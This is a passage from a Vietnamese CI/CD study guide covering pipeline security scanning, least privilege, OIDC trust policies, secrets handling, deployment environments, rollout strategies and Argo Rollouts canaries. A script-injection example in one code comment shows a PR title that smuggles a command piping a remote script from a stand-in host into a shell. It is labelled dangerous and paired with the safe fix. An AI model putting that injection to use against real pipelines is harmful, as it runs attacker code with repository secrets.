+<div class="tw"><table><tr><th>Loại</th><th>Tìm gì</th><th>Công cụ phổ biến</th><th>Khi nào</th></tr><tr><td><b>Quét bí mật</b></td><td>Khoá, token lỡ commit</td><td>gitleaks, trufflehog</td><td>Trước commit (pre-commit) và mỗi PR</td></tr><tr><td><b>SAST</b></td><td>Lỗ hổng trong mã nguồn (SQL injection, XSS...)</td><td>CodeQL, Semgrep, SonarQube</td><td>Mỗi PR</td></tr><tr><td><b>SCA / quét phụ thuộc</b></td><td>Thư viện có CVE đã biết, giấy phép</td><td>Dependabot, Renovate, Trivy, OWASP Dependency-Check, <code>npm audit</code>, <code>pip-audit</code></td><td>Mỗi PR và theo lịch</td></tr><tr><td><b>Quét image</b></td><td>CVE trong image nền và thư viện hệ thống</td><td>Trivy, Grype</td><td>Sau build, và định kỳ trên registry</td></tr><tr><td><b>Quét IaC</b></td><td>Cấu hình hạ tầng sai (bucket công khai, SG mở)</td><td>Trivy config, Checkov, tfsec</td><td>Mỗi PR có thay đổi hạ tầng</td></tr><tr><td><b>DAST</b></td><td>Lỗ hổng khi ứng dụng đang chạy</td><td>OWASP ZAP</td><td>Sau triển khai staging</td></tr><tr><td><b>SBOM</b></td><td>Danh sách thành phần để tra cứu khi có CVE mới</td><td>Syft</td><td>Mỗi bản phát hành</td></tr></table></div>
+<p>Nguyên tắc: bắt đầu bằng ngưỡng <b>chặn</b> thực tế (ví dụ chặn lỗ hổng mức cao đã có bản vá), không phải "chặn tất cả": quá nhiều cảnh báo nhiễu khiến người ta tắt công cụ. Ghi nhận ngoại lệ có thời hạn và người chịu trách nhiệm.</p>
+<h2>Bảo vệ chính pipeline</h2>
+<h3>Quyền tối thiểu</h3>
+<ul><li>Token của pipeline chỉ có quyền cần thiết: trong GitHub Actions đặt <code>permissions: contents: read</code> làm mặc định, mở thêm ở job cần.</li><li>Thông tin xác thực cloud <b>ngắn hạn qua OIDC</b>, vai trò riêng cho từng môi trường (<a href="#secrets-oidc">Bí mật và OIDC</a>).</li><li>Production chỉ triển khai được từ nhánh chính và qua môi trường có <b>bắt buộc duyệt</b>.</li></ul>
+<h3>Chuỗi cung ứng của chính pipeline</h3>
+<ul><li><b>Ghim action và template theo mã băm commit</b>, không dùng tag di động: <code>uses: actions/checkout@&lt;sha đầy đủ&gt;</code>. Tag của một action bên thứ ba có thể bị đổi sang mã độc. Dùng Renovate hoặc Dependabot để cập nhật các mã băm có kiểm soát.</li><li>Cân nhắc <b>allowlist</b> các action được phép dùng trong tổ chức.</li><li>Đọc mã của action/orb/plugin trước khi dùng nếu nó chạm tới bí mật hay quyền ghi.</li><li>Ghim phiên bản công cụ build và image nền.</li></ul>
+<h3>Dữ liệu không đáng tin trong pipeline</h3>
+<p>Tên nhánh, tiêu đề PR, nội dung commit, tên file đều do người khác kiểm soát. Đưa thẳng vào lệnh shell là <b>chèn script (script injection)</b>:</p>
+<pre><code><span class="cm"># NGUY HIỂM: tiêu đề PR có thể chứa lệnh, ví dụ  "; curl evil.sh | sh #</span>
+- run: echo "PR: ${{ github.event.pull_request.title }}"
+
+<span class="cm"># AN TOÀN hơn: truyền qua biến môi trường rồi dùng như dữ liệu</span>
+- run: echo "PR: $TITLE"
+  env:
+    TITLE: ${{ github.event.pull_request.title }}</code></pre>
+<h3>Pull request từ bên ngoài</h3>
+<ul><li>PR từ <b>fork</b> không được truy cập bí mật mặc định; giữ nguyên như vậy.</li><li><code>pull_request_target</code> (GitHub) chạy với bí mật và quyền ghi của repo đích: <b>không bao giờ</b> checkout rồi chạy mã của PR trong workflow đó.</li><li>Với repo công khai, yêu cầu người duyệt cho workflow chạy lần đầu của người đóng góp mới.</li></ul>
+<h3>Runner</h3>
+<ul><li>Runner tự lưu trữ nên <b>tạm thời</b> (mỗi job một máy sạch) và đặt trong mạng tách biệt; đừng để chúng tự do truy cập nội bộ.</li><li>Đừng chạy runner tự lưu trữ cho repo công khai nhận PR từ bên ngoài.</li><li>Với Docker trên runner: tránh gắn <code>docker.sock</code> hoặc chế độ privileged; ưu tiên Kaniko, Buildah hoặc BuildKit rootless.</li></ul>
+<h2>Bằng chứng nguồn gốc (provenance)</h2>
+<p>Khi build, sinh <b>SBOM</b> và <b>chứng thực nguồn gốc</b> (build từ commit nào, bởi pipeline nào), ký image bằng cosign, và ở phía triển khai <b>xác minh</b> chữ ký (Kyverno, policy-controller). Khung <b>SLSA</b> mô tả các mức bảo đảm: từ "có ghi lại provenance" đến "build không thể bị giả mạo". Ví dụ kỹ thuật ở <a href="https://tracviethustcs.github.io/k8s-study-notes/#adv-supply-chain" target="_blank" rel="noopener">Bảo mật chuỗi cung ứng image</a>.</p>
+<h2>Danh sách rà soát pipeline</h2>
+<div class="tw"><table><tr><th>Câu hỏi</th><th>Mong muốn</th></tr><tr><td>Token mặc định có quyền ghi không?</td><td>Chỉ đọc, mở thêm khi cần</td></tr><tr><td>Có khoá cloud dài hạn trong biến CI không?</td><td>Không: dùng OIDC</td></tr><tr><td>Action bên thứ ba ghim theo mã băm chưa?</td><td>Rồi</td></tr><tr><td>Dữ liệu từ PR có đi thẳng vào <code>run:</code> không?</td><td>Không: qua biến môi trường</td></tr><tr><td>PR từ fork có chạm bí mật không?</td><td>Không</td></tr><tr><td>Runner tự lưu trữ có tạm thời không?</td><td>Có</td></tr><tr><td>Triển khai production cần ai duyệt?</td><td>Có người duyệt, nhánh chính</td></tr><tr><td>Có quét bí mật, phụ thuộc, image, IaC không?</td><td>Có, với ngưỡng chặn rõ</td></tr></table></div>
+<div class="callout lab"><b>Rà soát một workflow có sẵn</b><p>Lấy một workflow trong repo của bạn và đối chiếu bảng rà soát ở trên. Cụ thể:</p>
+<pre><code>grep -n "uses:" .github/workflows/*.yml                    # action nào đang dùng, ghim thế nào?
+grep -n "permissions" .github/workflows/*.yml              # đã đặt quyền tối thiểu chưa?
+grep -n '\${{ github.event' .github/workflows/*.yml        # có chèn dữ liệu người dùng vào run: không?
+grep -n "pull_request_target" .github/workflows/*.yml
+gitleaks detect --source . 2&gt;/dev/null || echo "(cài gitleaks để quét bí mật)"</code></pre>
+<p>Liệt kê ba rủi ro lớn nhất bạn tìm được và cách sửa mỗi cái.</p></div>
+</article>
+<article class="page" data-id="secrets-oidc" data-group="An toàn" data-title="Bí mật và OIDC" hidden>
+<h1>Bí mật và OIDC</h1>
+<p class="lead">Bí mật dài hạn nằm trong biến CI là mục tiêu bị đánh cắp hấp dẫn. Liên kết danh tính (OIDC) cho phép pipeline nhận quyền ngắn hạn mà không lưu khoá nào.</p>
+<h2>Vấn đề của khoá dài hạn</h2>
+<p>Cách quen thuộc: tạo một người dùng IAM với khoá truy cập, dán vào secret của CI. Rủi ro: khoá không hết hạn, ai đọc được secret (hoặc làm lộ log) đều dùng được từ bất kỳ đâu, thường có quyền rộng và hiếm khi được xoay vòng.</p>
+<h2>OIDC: nhận quyền ngắn hạn theo danh tính</h2>
+<p>Với OIDC, nền tảng CI (GitHub, GitLab) phát hành một <b>token định danh ngắn hạn</b> cho mỗi lần chạy job, chứa thông tin về repo, nhánh, môi trường. Cloud được cấu hình <b>tin</b> nhà phát hành token đó và chỉ cấp quyền khi token khớp điều kiện bạn đặt.</p>
+<pre class="ascii"><code>   Job chạy  --(1) xin token OIDC--&gt;  GitHub (nhà phát hành)
+      |                                  |
+      |&lt;----- token: repo=org/app, ref=main, env=production ------+
+      |
+      +--(2) đưa token cho cloud (AssumeRoleWithWebIdentity)--&gt; AWS
+                                                                 |  kiểm tra: tin issuer? khớp sub?
+      &lt;------(3) thông tin xác thực TẠM THỜI (hết hạn sau ~1 giờ) +
+      |
+      +--(4) dùng quyền tạm để triển khai</code></pre>
+<p>Trên AWS, vai trò IAM có <b>trust policy</b> giới hạn danh tính được assume:</p>
+<pre><code>{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"Federated": "arn:aws:iam::111111111111:oidc-provider/token.actions.githubusercontent.com"},
+    "Action": "sts:AssumeRoleWithWebIdentity",
+    "Condition": {
+      "StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"},
+      "StringLike":   {"token.actions.githubusercontent.com:sub": "repo:myorg/myapp:ref:refs/heads/main"}
+    }
+  }]
+}</code></pre>
+<p>Điều kiện <code>sub</code> là chỗ <b>quan trọng nhất</b>: nó giới hạn đúng repo và nhánh (hoặc môi trường) được phép. Một điều kiện quá rộng (<code>repo:myorg/*</code>) cho phép mọi repo trong tổ chức dùng vai trò đó.</p>
+<p>Workflow tương ứng:</p>
+<pre><code>permissions:
+  id-token: write            # cho phép job xin token OIDC
+  contents: read
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: production
+    steps:
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::111111111111:role/gha-deploy-prod
+          aws-region: ap-southeast-1
+      - run: aws sts get-caller-identity</code></pre>
+<p>Azure, GCP, Vault và nhiều dịch vụ khác cũng hỗ trợ liên kết danh tính tương tự. GitLab phát hành token qua <code>id_tokens:</code>.</p>
+<h2>Khi vẫn cần bí mật</h2>
+<p>Một số thứ không có OIDC (khoá API của dịch vụ bên thứ ba, mật khẩu). Quy tắc:</p>
+<div class="tw"><table><tr><th>Việc</th><th>Cách làm</th></tr><tr><td>Lưu</td><td>Trong kho bí mật của nền tảng CI hoặc Vault; <b>không</b> trong mã, <code>.env</code> đã commit, hay image</td></tr><tr><td>Phạm vi</td><td>Bí mật <b>theo môi trường</b> (production chỉ có ở môi trường production có duyệt), không dùng chung toàn repo</td></tr><tr><td>Quyền</td><td>Mỗi bí mật có quyền tối thiểu; một khoá cho một mục đích</td></tr><tr><td>Log</td><td>Che giá trị (masking); không <code>echo</code> biến môi trường; không bật chế độ debug chi tiết khi có bí mật</td></tr><tr><td>Xoay vòng</td><td>Đặt lịch xoay vòng; có quy trình khi nghi lộ: xoay vòng <b>ngay</b></td></tr><tr><td>PR từ fork</td><td>Không truyền bí mật cho workflow của PR từ bên ngoài</td></tr></table></div>
+<p>Đưa bí mật vào ứng dụng lúc <b>chạy</b> (Secret của Kubernetes từ Vault bằng Vault Secrets Operator, <a href="https://tracviethustcs.github.io/k8s-study-notes/#tool-secrets" target="_blank" rel="noopener">xem</a>) thay vì để pipeline giữ bí mật của ứng dụng và truyền vào lúc triển khai.</p>
+<h2>Phát hiện và ứng phó khi lộ</h2>
+<ul><li>Quét bí mật trước khi commit và trong CI (gitleaks, trufflehog), và bật tính năng quét bí mật của nền tảng.</li><li>Nếu bí mật đã bị commit: <b>coi như đã lộ</b>, xoay vòng ngay. Xoá khỏi lịch sử Git chỉ là bước dọn dẹp sau, không thay thế việc xoay vòng.</li><li>Giám sát nhật ký truy cập của cloud (CloudTrail) cho hoạt động bất thường của danh tính pipeline.</li></ul>
+<div class="callout lab"><b>Thiết kế trust policy cho hai môi trường</b><p>Không cần cloud thật: viết ra (trên giấy hoặc tệp JSON) hai trust policy cho hai vai trò:</p>
+<ol><li><code>deploy-stg</code>: cho phép workflow từ nhánh <code>main</code> của repo <code>myorg/myapp</code> (môi trường <code>staging</code>) assume.</li><li><code>deploy-prod</code>: chỉ cho phép khi workflow chạy trong môi trường <code>production</code> (điều kiện <code>sub</code> dạng <code>repo:myorg/myapp:environment:production</code>).</li></ol>
+<p>Với mỗi policy, trả lời: nếu ai đó tạo một nhánh mới tên <code>evil</code> và sửa workflow, họ có assume được vai trò không? Điều kiện nào ngăn việc đó?</p></div>
+</article>
+<article class="page" data-id="environments" data-group="Phát hành" data-title="Môi trường và quản lý cấu hình" hidden>
+<h1>Môi trường và quản lý cấu hình</h1>
+<p class="lead">Môi trường là nơi artifact chạy: dev, staging, production, và đôi khi môi trường tạm cho từng pull request. Điều quan trọng là các môi trường giống nhau ở mọi thứ trừ cấu hình.</p>
+<h2>Các môi trường điển hình</h2>
+<div class="tw"><table><tr><th>Môi trường</th><th>Mục đích</th><th>Dữ liệu</th><th>Triển khai</th></tr><tr><td><b>Dev</b></td><td>Phát triển, thử nhanh</td><td>Giả, tổng hợp</td><td>Tự động, mỗi merge</td></tr><tr><td><b>Staging</b> (pre-prod)</td><td>Kiểm thử giống production trước khi phát hành</td><td>Giả hoặc ẩn danh</td><td>Tự động sau dev</td></tr><tr><td><b>Production</b></td><td>Người dùng thật</td><td>Thật</td><td>Có kiểm soát: duyệt, cửa sổ thời gian, hoặc tự động nếu đủ tin cậy</td></tr><tr><td><b>Preview / ephemeral</b></td><td>Xem thử một PR cụ thể</td><td>Giả</td><td>Tạo khi mở PR, xoá khi đóng</td></tr></table></div>
+<p>Staging có ích khi nó <b>gần giống production</b> (cùng loại hạ tầng, cùng cấu hình, dữ liệu có hình dạng tương tự). Staging khác production nhiều thì "qua staging" không nói được gì. Với một số hệ thống, kiểm thử trực tiếp ở production bằng phát hành dần (canary) kèm quan sát còn đáng tin hơn staging.</p>
+<h2>Cấu hình tách khỏi mã</h2>
+<p>Theo nguyên tắc của "twelve-factor": <b>cấu hình đổi theo môi trường nằm ngoài artifact</b>, nhận qua biến môi trường hoặc tệp cấu hình gắn vào lúc chạy.</p>
+<div class="tw"><table><tr><th>Loại</th><th>Ví dụ</th><th>Nơi để</th></tr><tr><td>Cấu hình không nhạy cảm</td><td>URL dịch vụ, mức log, số worker</td><td>Repo cấu hình (ConfigMap, Helm values theo môi trường)</td></tr><tr><td>Bí mật</td><td>Mật khẩu, khoá API</td><td>Kho bí mật (Vault, Secrets Manager), không trong Git (<a href="#secrets-oidc">Bí mật và OIDC</a>)</td></tr><tr><td>Cờ tính năng</td><td>Bật/tắt chức năng</td><td>Hệ thống cờ tính năng (xem bên dưới)</td></tr></table></div>
+<p>Mỗi môi trường có tệp giá trị riêng nhưng dùng <b>cùng artifact và cùng chart/manifest nền</b>:</p>
+<pre><code>deploy/
+├── base/                    # manifest chung (Kustomize base hoặc chart)
+└── envs/
+    ├── dev/values.yaml      # replicas: 1, log: debug
+    ├── staging/values.yaml  # replicas: 2
+    └── prod/values.yaml     # replicas: 5, tài nguyên lớn hơn</code></pre>
+<p>Xem <a href="https://tracviethustcs.github.io/k8s-study-notes/#helm" target="_blank" rel="noopener">Helm và Kustomize</a>.</p>
+<h2>Quy tắc bảo vệ môi trường</h2>
+<ul><li>Production: chỉ triển khai từ <b>nhánh chính hoặc tag</b>, <b>bắt buộc người duyệt</b> (nếu là Continuous Delivery), nhật ký ai triển khai gì và khi nào.</li><li><b>Quyền riêng</b> cho từng môi trường: danh tính của pipeline dev không dùng được ở production.</li><li><b>Đồng bộ thứ tự</b>: không đưa lên production thứ chưa qua staging.</li><li><b>Khoá triển khai</b> để hai lần triển khai không chạy chồng nhau (<code>concurrency</code> ở Actions, <code>resource_group</code> ở GitLab).</li><li><b>Cửa sổ triển khai</b>: tránh giờ cao điểm hoặc cuối tuần với hệ thống chưa tự tin quay lui.</li></ul>
+<h2>Môi trường tạm cho mỗi pull request</h2>
+<p>Dựng một môi trường nhỏ cho mỗi PR (ví dụ một namespace Kubernetes) để review và kiểm thử trực quan, rồi xoá khi PR đóng:</p>
+<pre><code>on:
+  pull_request:
+    types: [opened, synchronize, reopened, closed]
+jobs:
+  preview:
+    if: github.event.action != 'closed'
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: ./deploy-preview.sh "pr-${{ github.event.number }}" "${{ github.sha }}"
+  cleanup:
+    if: github.event.action == 'closed'
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./destroy-preview.sh "pr-${{ github.event.number }}"</code></pre>
+<p>Nhớ giới hạn tài nguyên (ResourceQuota) và thời gian sống, nếu không chi phí tăng dần.</p>
+<h2>Cờ tính năng</h2>
+<p>Cờ tính năng (feature flag) tách <b>triển khai</b> (mã đã nằm trên production) khỏi <b>phát hành</b> (người dùng thấy tính năng):</p>
+<ul><li>Merge và triển khai mã chưa hoàn thiện sau một cờ đang tắt.</li><li>Bật dần theo phần trăm người dùng, nhóm nội bộ, hoặc theo vùng.</li><li><b>Công tắc khẩn cấp (kill switch)</b>: tắt một tính năng lỗi ngay mà không cần triển khai lại.</li></ul>
+<p>Chi phí: cờ là mã điều kiện cần được kiểm thử ở cả hai trạng thái, và <b>phải dọn</b> khi tính năng đã ổn định (cờ cũ tích tụ thành nợ kỹ thuật). Công cụ: Unleash, OpenFeature (chuẩn mở), các dịch vụ thương mại.</p>
+<div class="callout lab"><b>Cùng một artifact, cấu hình khác nhau</b><pre><code>mkdir -p ~/env-lab &amp;&amp; cd ~/env-lab
+mkdir -p base envs/dev envs/prod
+printf 'resources: [deploy.yaml]\n' &gt; base/kustomization.yaml
+cat &gt; base/deploy.yaml &lt;&lt;'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata: {name: web}
+spec:
+  replicas: 1
+  selector: {matchLabels: {app: web}}
+  template:
+    metadata: {labels: {app: web}}
+    spec:
+      containers:
+        - {name: web, image: registry.example.com/web:3f1a9c2, env: [{name: LOG_LEVEL, value: info}]}
+EOF
+printf 'resources: [../../base]\npatches:\n  - patch: |-\n      - op: replace\n        path: /spec/replicas\n        value: 5\n    target: {kind: Deployment, name: web}\n' &gt; envs/prod/kustomization.yaml
+printf 'resources: [../../base]\n' &gt; envs/dev/kustomization.yaml
+kubectl kustomize envs/dev | grep -E "replicas|image"
+kubectl kustomize envs/prod | grep -E "replicas|image"</code></pre>
+<p>Quan sát: image giữ nguyên ở hai môi trường, chỉ <code>replicas</code> đổi. Đây là "một artifact, nhiều cấu hình".</p></div>
+</article>
+<article class="page" data-id="deploy-strategies" data-group="Phát hành" data-title="Chiến lược phát hành" hidden>
+<h1>Chiến lược phát hành</h1>
+<p class="lead">Cách đưa một phiên bản mới thay phiên bản cũ quyết định rủi ro, gián đoạn và chi phí. Không có chiến lược "tốt nhất": chọn theo mức chịu rủi ro và khả năng của hạ tầng.</p>
+<h2>Các chiến lược</h2>
+<div class="tw"><table><tr><th>Chiến lược</th><th>Cách làm</th><th>Gián đoạn</th><th>Chi phí hạ tầng</th><th>Quay lui</th><th>Rủi ro</th></tr><tr><td><b>Recreate</b></td><td>Tắt bản cũ, bật bản mới</td><td><b>Có</b> (khoảng chết)</td><td>Thấp</td><td>Chậm (triển khai lại)</td><td>Cao với dịch vụ trực tuyến</td></tr><tr><td><b>Rolling</b></td><td>Thay dần từng Pod/máy</td><td>Không (nếu probe đúng)</td><td>Thấp (dư một ít)</td><td>Trung bình (rolling ngược)</td><td>Lỗi lan dần trong lúc thay</td></tr><tr><td><b>Blue-green</b></td><td>Dựng song song bản mới (green), chuyển toàn bộ traffic từ cũ (blue) sang</td><td>Không</td><td><b>Cao</b> (gấp đôi tạm thời)</td><td><b>Rất nhanh</b> (chuyển lại)</td><td>Chuyển một lần toàn bộ: nếu lỗi, mọi người đều bị</td></tr><tr><td><b>Canary</b></td><td>Cho một phần nhỏ traffic (1%, 5%...) vào bản mới, tăng dần nếu ổn</td><td>Không</td><td>Thấp đến trung bình</td><td>Nhanh (rút traffic)</td><td>Thấp: chỉ một phần nhỏ người dùng chịu rủi ro</td></tr><tr><td><b>Shadow / mirror</b></td><td>Sao chép traffic thật sang bản mới nhưng không trả kết quả cho người dùng</td><td>Không</td><td>Cao</td><td>Không cần</td><td>Rất thấp, nhưng cần xử lý tác dụng phụ (ghi dữ liệu, gửi email)</td></tr><tr><td><b>A/B test</b></td><td>Chia người dùng theo nhóm để so sánh một chỉ số kinh doanh</td><td>Không</td><td>Trung bình</td><td>Dễ</td><td>Là kiểm thử sản phẩm, không phải kỹ thuật phát hành</td></tr></table></div>
+<h2>Sơ đồ</h2>
+<pre class="ascii"><code> BLUE-GREEN                                CANARY
+ ----------                                ------
+   Load balancer / Ingress                   Load balancer / Ingress
+      |  (chuyển 100% một lần)                  |  95%            |  5%
+      v                                          v                 v
+  +--------+     +--------+                 +--------+        +--------+
+  |  BLUE  |     | GREEN  |                 | v1 (cũ)|        | v2 (mới)|
+  |  v1    |     |  v2    |                 +--------+        +--------+
+  +--------+     +--------+                 quan sát chỉ số --&gt; tăng 5% -&gt; 25% -&gt; 50% -&gt; 100%
+  bật green, kiểm thử, rồi đổi              (nếu chỉ số xấu: rút về 0%)
+  đích của load balancer</code></pre>
+<h2>Triển khai trên Kubernetes</h2>
+<div class="tw"><table><tr><th>Chiến lược</th><th>Cách thực hiện</th></tr><tr><td>Recreate</td><td><code>strategy: {type: Recreate}</code> trong Deployment</td></tr><tr><td>Rolling</td><td>Mặc định của Deployment: <code>maxSurge</code>, <code>maxUnavailable</code>, cùng readiness probe (<a href="https://tracviethustcs.github.io/k8s-study-notes/#ops-probes" target="_blank" rel="noopener">Probe</a>)</td></tr><tr><td>Blue-green</td><td>Hai Deployment, một Service; đổi <code>selector</code> của Service (hoặc đổi backend của Ingress) sang bản mới. Công cụ: Argo Rollouts</td></tr><tr><td>Canary</td><td>Chia trọng số bằng Ingress controller (annotation canary), service mesh, Gateway API, hoặc Argo Rollouts/Flagger tự động hoá (<a href="#progressive-delivery">Progressive delivery</a>)</td></tr></table></div>
+<h2>Chọn chiến lược</h2>
+<div class="tw"><table><tr><th>Nếu</th><th>Nên</th></tr><tr><td>Chấp nhận khoảng chết ngắn, ứng dụng nội bộ, tiết kiệm</td><td>Recreate</td></tr><tr><td>Dịch vụ web thông thường, thay đổi nhỏ, có probe tốt</td><td>Rolling</td></tr><tr><td>Cần quay lui tức thì và có ngân sách hạ tầng</td><td>Blue-green</td></tr><tr><td>Thay đổi rủi ro hoặc nhiều người dùng, có chỉ số tốt để quan sát</td><td>Canary</td></tr><tr><td>Muốn thử bản mới với traffic thật mà không ảnh hưởng người dùng</td><td>Shadow</td></tr></table></div>
+<p>Hai điều kiện chung làm cho bất kỳ chiến lược nào an toàn: <b>tương thích ngược</b> giữa bản cũ và mới (hai bản chạy cùng lúc trong lúc chuyển, và dùng chung database: xem <a href="#db-migrations">Migration database</a>), và <b>giám sát đủ tốt</b> để biết bản mới có đang hỏng không.</p>
+<h2>Kết hợp với cờ tính năng</h2>
+<p>Triển khai (đưa mã lên) và phát hành (bật cho người dùng) là hai việc. Cờ tính năng cho phép phát hành dần, hoặc tắt ngay một tính năng lỗi mà không triển khai lại: thường nhanh hơn và nhỏ rủi ro hơn rollback cả phiên bản. Canary bảo vệ ở mức <b>phiên bản</b>, cờ bảo vệ ở mức <b>tính năng</b>; hai thứ bổ sung nhau.</p>
+<h2>Những cái bẫy</h2>
+<ul><li><b>Hai phiên bản cùng chạy</b> (rolling, canary) nghĩa là mọi thay đổi giao diện, hợp đồng message và schema phải chạy được với cả bản cũ lẫn mới.</li><li><b>Phiên (session) và trạng thái trong bộ nhớ</b> mất khi Pod bị thay: lưu bên ngoài.</li><li><b>Cache và client cũ</b>: client tải về trước đó có thể vẫn gọi giao diện cũ.</li><li><b>Blue-green</b> tốn gấp đôi tài nguyên trong lúc chuyển và dữ liệu (database) vẫn chỉ có một: nó không quay lui được những thay đổi dữ liệu đã làm.</li><li><b>Canary không có chỉ số tốt</b> chỉ là rolling chậm: nếu không đo tỷ lệ lỗi và độ trễ, không có gì để quyết định tăng hay rút.</li></ul>
+<div class="callout lab"><b>Rolling và blue-green trên cụm cục bộ</b><pre><code>kind create cluster --name cd-lab                      # hoặc dùng cụm bất kỳ
+kubectl create deployment web --image=nginx:1.26 --replicas=3
+kubectl set image deployment/web nginx=nginx:1.27 &amp;&amp; kubectl rollout status deployment/web   # rolling
+kubectl rollout undo deployment/web                    # quay lui rolling
+
+<span class="cm"># blue-green bằng đổi selector của Service (mỗi Deployment tự có nhãn app=&lt;tên&gt;)</span>
+kubectl create deployment blue  --image=nginx:1.26
+kubectl create deployment green --image=nginx:1.27
+kubectl rollout status deployment/blue &amp;&amp; kubectl rollout status deployment/green
+kubectl expose deployment blue --name=svc --port=80 --selector=app=blue
+kubectl get endpoints svc
+kubectl patch service svc -p '{"spec":{"selector":{"app":"green"}}}'   # chuyển 100% traffic sang green
+kubectl get endpoints svc
+kind delete cluster --name cd-lab</code></pre>
+<p>Quan sát: danh sách endpoint của Service đổi thế nào khi bạn đổi selector? So với rolling, việc chuyển và quay lui nhanh hơn hay chậm hơn?</p></div>
+</article>
+<article class="page" data-id="progressive-delivery" data-group="Phát hành" data-title="Progressive delivery: canary tự động" hidden>
+<h1>Progressive delivery: canary tự động</h1>
+<p class="lead">Progressive delivery là phát hành dần theo các bước, kiểm tra chỉ số ở mỗi bước và tự rút lại khi chỉ số xấu. Trên Kubernetes, Argo Rollouts và Flagger làm việc đó.</p>
+<h2>Ý tưởng</h2>
+<p>Thay vì "bật bản mới cho mọi người rồi hy vọng", ta làm:</p>
+<ol><li>Cho <b>một phần nhỏ</b> traffic vào bản mới.</li><li><b>Đo</b> các chỉ số (tỷ lệ lỗi, độ trễ, chỉ số nghiệp vụ) trong một khoảng thời gian.</li><li>Nếu <b>đạt ngưỡng</b>, tăng tỷ lệ; nếu <b>không đạt</b>, <b>tự động quay lui</b>.</li><li>Lặp lại tới 100%.</li></ol>
+<p>Quyết định dựa trên <b>số liệu thật</b>, không phải cảm giác. Điều này đòi hỏi bạn đã có chỉ số tốt (Prometheus, <a href="https://tracviethustcs.github.io/k8s-study-notes/#tool-observe" target="_blank" rel="noopener">giám sát</a>) và SLO rõ ràng.</p>
+<h2>Argo Rollouts</h2>
+<p>Argo Rollouts thêm resource <code>Rollout</code> thay cho <code>Deployment</code>, hỗ trợ canary và blue-green có phân tích chỉ số.</p>
+<pre><code>apiVersion: argoproj.io/v1alpha1
+kind: Rollout
+metadata: {name: web}
+spec:
+  replicas: 5
+  selector: {matchLabels: {app: web}}
+  strategy:
+    canary:
+      steps:
+        - setWeight: 10
+        - pause: {duration: 5m}
+        - analysis:
+            templates:
+              - templateName: success-rate
+        - setWeight: 50
+        - pause: {duration: 10m}
+        - setWeight: 100
+  template:
+    metadata: {labels: {app: web}}
+    spec:
+      containers:
+        - name: web
+          image: registry.example.com/web:3f1a9c2</code></pre>
+<p>Phân tích chỉ số khai báo bằng <code>AnalysisTemplate</code>, ví dụ truy vấn Prometheus:</p>
+<pre><code>apiVersion: argoproj.io/v1alpha1
+kind: AnalysisTemplate
+metadata: {name: success-rate}
+spec:
+  metrics:
+    - name: success-rate
+      interval: 1m
+      count: 5
+      successCondition: result[0] &gt;= 0.99
+      failureLimit: 1
+      provider:
+        prometheus:
+          address: http://prometheus.monitoring:9090
+          query: |
+            sum(rate(http_requests_total{app="web",code!~"5.."}[2m]))
+            /
+            sum(rate(http_requests_total{app="web"}[2m]))</code></pre>
+<p>Nếu tỷ lệ thành công thấp hơn 99% vượt giới hạn lỗi, Rollout <b>tự động huỷ</b> và đưa traffic về bản ổn định. Việc chia traffic thực sự theo trọng số cần ingress controller hoặc service mesh được hỗ trợ (nếu không, Rollouts chia theo số Pod). Tên trường và hành vi theo phiên bản: xem tài liệu của dự án.</p>
+<h2>Flagger</h2>
+<p>Flagger làm việc tương tự nhưng giữ nguyên <code>Deployment</code> và tạo các thành phần phụ trợ; tích hợp nhiều với service mesh và ingress. Chọn giữa hai công cụ theo hệ sinh thái bạn dùng (Argo Rollouts đi cùng Argo CD; Flagger đi cùng Flux).</p>
+<h2>Thiết kế chỉ số cho cổng phát hành</h2>
+<div class="tw"><table><tr><th>Loại chỉ số</th><th>Ví dụ</th><th>Lưu ý</th></tr><tr><td>Tỷ lệ lỗi</td><td>% phản hồi 5xx</td><td>So sánh canary với bản ổn định, không chỉ so với ngưỡng cố định</td></tr><tr><td>Độ trễ</td><td>p95, p99</td><td>Cần đủ lượng request để thống kê có nghĩa</td></tr><tr><td>Bão hoà</td><td>CPU, bộ nhớ, hàng đợi</td><td>Phát hiện rò rỉ chậm</td></tr><tr><td>Nghiệp vụ</td><td>Tỷ lệ thanh toán thành công, đăng nhập</td><td>Bắt lỗi mà kỹ thuật không thấy</td></tr></table></div>
+<p>Những lưu ý hay bị bỏ sót:</p>
+<ul><li><b>Lượng traffic đủ lớn</b>: 5% của một dịch vụ ít request không cho thống kê có ý nghĩa trong 5 phút. Chọn thời gian và tỷ lệ theo lưu lượng.</li><li><b>Đo canary tách riêng</b>: chỉ số phải tách được traffic của bản mới (nhãn <code>version</code> hoặc <code>rollouts-pod-template-hash</code>), nếu không bản lỗi bị trộn với bản tốt.</li><li><b>Cổng nên bảo thủ</b>: ngưỡng quá chặt gây rollback giả (nhiễu), quá lỏng thì bỏ lọt lỗi.</li><li>Luôn có <b>đường quay lui thủ công</b> phòng khi tự động hoá lỗi.</li></ul>
+<h2>Khi nào không cần</h2>
+<p>Nếu dịch vụ chưa có chỉ số đáng tin cậy, hoặc lượng traffic quá nhỏ, progressive delivery tự động chưa mang lại giá trị: hãy bắt đầu bằng rolling update tốt, probe đúng và giám sát, rồi nâng cấp dần.</p>
+<div class="callout lab"><b>Thiết kế cổng canary trên giấy</b><p>Cho một API có 200 request/phút. Bạn muốn canary 10% trong 5 phút, cổng là "tỷ lệ 5xx của canary nhỏ hơn 1%".</p>
+<ol><li>Canary nhận bao nhiêu request trong 5 phút? (10% của 200/phút × 5 phút)</li><li>Với số request đó, một lỗi đơn lẻ đã đủ gây ra tỷ lệ bao nhiêu? Cổng 1% còn ý nghĩa không?</li><li>Bạn sẽ đổi thiết kế thế nào (thời gian dài hơn, tỷ lệ cao hơn, ngưỡng theo số lượng lỗi, chỉ số khác)?</li></ol></div>
+</article>
+<article class="page" data-id="gitops-cd" data-group="Phát hành" data-title="GitOps: CD kiểu khai báo" hidden>
+<h1>GitOps: CD kiểu khai báo</h1>
